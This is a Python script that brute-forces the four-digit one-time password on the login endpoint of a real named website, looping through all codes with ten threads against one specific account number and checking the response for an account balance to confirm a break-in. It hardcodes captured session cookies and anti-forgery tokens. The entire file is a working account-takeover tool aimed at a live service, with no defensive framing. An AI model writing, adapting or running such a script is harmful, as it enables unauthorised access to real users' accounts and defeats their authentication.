import requests
from concurrent.futures import ThreadPoolExecutor

# Set the target URL
url = "https://www.d2h.com/user-login"

# Define headers
headers = {
    "Cookie": "ApplicationGatewayAffinityCORS=ef97db2255fbd6c121aa985356156f21; ApplicationGatewayAffinity=ef97db2255fbd6c121aa985356156f21; ASP.NET_SessionId=mqalkk4x5hdhx3fmqfy3gpgj; __RequestVerificationToken=UV6xKmlmpEtZOHujfZqeyxEy72iNH8RcqogexcKXjxHHVtRaNzUWKn3mQH-Fzs3rzY5MoHAYCA2DTh0OX8dw2bWQXlkwDy4VJgQFnlv6D1I1",
    "Sec-Ch-Ua-Platform": "\"Linux\"",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Sec-Ch-Ua": "\"Chromium\";v=\"130\", \"Brave\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarybghnSygtveQVBqjI",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Gpc": "1",
    "Accept-Language": "en-GB,en;q=0.8",
    "Origin": "https://www.d2h.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

# Function to test each OTP
def check_otp(otp):
    data = {
        "InputType": "VCNo",
        "Password": otp,           # Set the OTP here
        "UserInput": "02900254803", # Set the VCNo or user input here
        "returnurl": "/recharge/pay-later",
        "RequestType": "otpvalidate",
        "VCNo": "",                # Empty field as per the structure provided
        "rememberMe": "false",
        "__RequestVerificationToken": "VnepU3bAhMRn9ufLVeAHgqSk8ZXUTf0mDCvZyG5l2ctrzHFttwEgo8yjzkGI6GT05xJ8n3cLTisBzjjq1ZyfulsPvgoqlqE3nU3KhPtBDz41"
    }
    
    response = requests.post(url, headers=headers, data=data)
    
    # Check if OTP is successful
    if "Account Balance:" in response.text:
        print(f"Correct OTP found: {otp}")
        return True
    else:
        print(f"Incorrect OTP: {otp}")
    return False

# Brute-force using threads from 0001 to 9999
def brute_force():
    with ThreadPoolExecutor(max_workers=10) as executor:
        # Create a task for each OTP in range
        futures = {executor.submit(check_otp, str(i).zfill(4)): i for i in range(1, 10000)}
        for future in futures:
            if future.result():
                # If a correct OTP is found, shut down all threads
                executor.shutdown(cancel_futures=True)
                break

if __name__ == "__main__":
    brute_force()
